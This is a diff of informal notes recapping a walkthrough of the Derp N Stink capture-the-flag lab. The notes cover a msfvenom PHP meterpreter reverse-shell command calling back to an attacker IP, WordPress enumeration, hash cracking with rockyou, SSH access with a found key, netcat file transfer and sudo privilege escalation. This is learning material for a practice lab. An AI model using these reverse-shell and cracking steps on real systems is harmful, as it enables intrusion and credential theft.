@@ -21,8 +21,22 @@ Welcome! Today Jack is going to walkthrough Derp N Stink CTF to break into anoth
 - He found data on the vunerability list, in which each vunerability to explain what it the vunerability is, how to break into the vunerability, and date of fixed. 
 - So, Jack file out detail on the vunerability on exploit database. 
 - And he download the script to break in the vunerability
-- Back on terminal, he used the command: msf -p php/meterpreter_reverse-tcp-LHOST = 192.168.170.128 LPORT = 4444 -f raw . shell.php, to reverse engineer the webite with shell.
-- After that, he is running the exploit and the python command to upload the shell to gain access to the machine.
+- Back on terminal, he used the command: msfvenom -p php/meterpreter_reverse-tcp-LHOST = 192.168.170.128 LPORT = 4444 -f raw . shell.php, to reverse engineer the webite with shell.
+- After that, he is running the exploit and the python command to upload the shell to gain access to the machine. His payload ios a reverse tcp shell
 - After gaining access to the machine, check whoami, found two folder. One being stinky
 - Then he check all the website file through weblog ls, this give him acess to IP file, password and userfile. Password might be encoded so use hashid.
-- 
+- Exploit is using the vunerability, payload is the tool of to exploitation
+- HE figured out that htere rwould be another user on WPscan as he can't gain access opn the first one
+- Once he ran the weblog, he found the weblog to the website which has the config file, tranfered that to his own machine and log in to wordpress. 
+- This give he info on the another account, with the password in hash. He used hashcat to decifer it and move the hash into a file. 
+- Ran that file into the rockyou word list
+- Password is "wedgie57", and login into unclestinky and found flag2
+- Now knowing that ssh is also open for thie vunerable machine, 
+- He use ftp to get into the computer, found a file called derp.txt. The file has text and clue to another file
+- He found a private key for the ssh, its a rsa cipher. 
+- So he used ssh -i -key.txt to the machine. Permission is to high so he change the permission on the machine.
+- Now, he is now stinky, he procedd to check all the file. Found a pcap file and flag.txt, which has flag 3.
+- Jack now proceed to break the pcap file, in which he tried to push the file to his own machine by netcat. 
+- Back on wireshark, he looking on the conversation on stinky. Which also show info on mrderp user on wordpress, found the password.
+- Now he log into mrderp, scan for file, ran sudo -l  on mrderp, in which he found the code (ALL) /home/mrderp/binaries/derpy*
+- changemod the derp.sh to derp, gain access to root through sudo, found the file of flag4. 
